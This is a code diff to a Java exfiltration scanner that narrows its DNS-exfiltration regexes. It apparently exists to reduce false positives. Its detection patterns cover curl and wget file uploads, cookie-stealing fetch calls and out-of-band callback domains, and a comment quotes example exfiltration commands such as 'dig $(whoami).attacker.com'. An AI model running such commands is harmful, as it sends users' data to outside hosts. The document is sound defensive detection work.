@@ -53,9 +53,22 @@ public class CodeAbuseScanner {
           Pattern.compile("curl\\s+.*--data-binary\\s+@"),
           Pattern.compile("wget\\s+.*--post-file"),
           Pattern.compile("\\bfetch\\s*\\(.*document\\.cookie", Pattern.CASE_INSENSITIVE),
-          // DNS exfiltration
-          Pattern.compile("\\bdig\\b.*\\$\\("),
-          Pattern.compile("\\bnslookup\\b.*\\$\\("),
+          // B-26 fix (2026-05-09) — DNS exfiltration. Pre-fix patterns matched
+          // any `dig`/`nslookup` followed by `$(` anywhere — including in an
+          // unclosed half-subshell that the shell wouldn't actually execute.
+          // False-positive examples that the old patterns flagged: a doc snippet
+          // containing the literal text "dig $(whatever" (no closing paren), a
+          // tutorial showing the syntax of subshells, a test command like
+          // `nslookup example.com` followed by an unrelated `$(date)` later in
+          // the same buffer.
+          //
+          // Narrowed: require the subshell be CLOSED (real invocation) AND
+          // appear in arg position (whitespace + `$(...)`). Real exfil shapes
+          // (`dig $(whoami).attacker.com`, `nslookup $(curl ...).oast.fun`) all
+          // close their subshell — that's the operational shape, not an open
+          // paren in random prose.
+          Pattern.compile("\\bdig\\b\\s+\\S*\\$\\([^)]+\\)"),
+          Pattern.compile("\\bnslookup\\b\\s+\\S*\\$\\([^)]+\\)"),
           Pattern.compile("\\bburpcollaborator\\.net\\b", Pattern.CASE_INSENSITIVE),
           Pattern.compile("\\binteractsh\\.com\\b", Pattern.CASE_INSENSITIVE),
           Pattern.compile("\\boast\\.(fun|pro|me)\\b", Pattern.CASE_INSENSITIVE));
